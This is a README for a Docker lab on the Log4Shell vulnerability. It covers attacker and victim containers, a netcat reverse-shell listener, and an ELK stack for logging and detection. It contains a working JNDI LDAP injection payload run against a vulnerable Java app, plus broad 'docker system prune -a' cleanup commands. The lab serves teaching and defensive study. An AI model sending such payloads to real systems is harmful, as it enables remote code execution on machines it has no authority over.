# 3204

## Set up Attack
```
cd log4jshell-lab/attacker
docker-compose build 
docker-compose up -d 
```

## Start the java app
```
cd log4jshell-lab/victim/vuln-apps/others/basicJar
docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
```

## In Workstation 1
### Open Workstation Terminal
Open 2 terminals, one for nc to listen and another ro execute exploit
```
sudo docker exec -it attacker-workstation1 bash
```
### Start net cat listener 
```
nc -lvnp 443
```

### Run exploit 
Replace `127.0.0.1` with IP address of LDAP
```
cd /basicJar
java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
```



# ELK Set up
Clone repository </br>
https://github.com/deviantony/docker-elk


# run file
#sudo docker-compose build<br/>
#sudo docker-compose up -d 


# check IP
#sudo docker-compose ps 
	sudo docker-compose <id container> | grep IPAddress
  
# stop docker 
	sudo docker-compose kill && docker-compose rm -f 

# Network connectivity
	docker network create --driver=bridge --subnet=192.168.0.0/24 3204_network

	docker network connect --ip 192.168.0.5 3204_network web-server
	docker network connect --ip 192.168.0.6 3204_network ldap-server

	docker network connect --ip 192.168.0.2 3204_network docker-elk-main-kibana-1
	docker network connect --ip 192.168.0.3 3204_network docker-elk-main-logstash-1
	docker network connect --ip 192.168.0.4 3204_network docker-elk-main-elasticsearch-1 

# Shell Access
	docker exec -ti docker-elk-main-kibana-1 /bin/bash
	docker exec -ti docker-elk-main-logstash-1 /bin/bash
	docker exec -ti docker-elk-main-elasticsearch-1 /bin/bash
	docker exec -ti web-server /bin/bash
	docker exec -ti ldap-server /bin/bash
	
# Clean Containers
	docker system prune -a
	y

	docker network prune
	y

	docker container prune
	y

# Ports
5044: Logstash Beats input</br>
50000: Logstash TCP input</br>
9600: Logstash monitoring API</br>
9200: Elasticsearch HTTP</br>
9300: Elasticsearch TCP transport</br>
5601: Kibana</br>

# filebeat.yml Config
Copy from repo
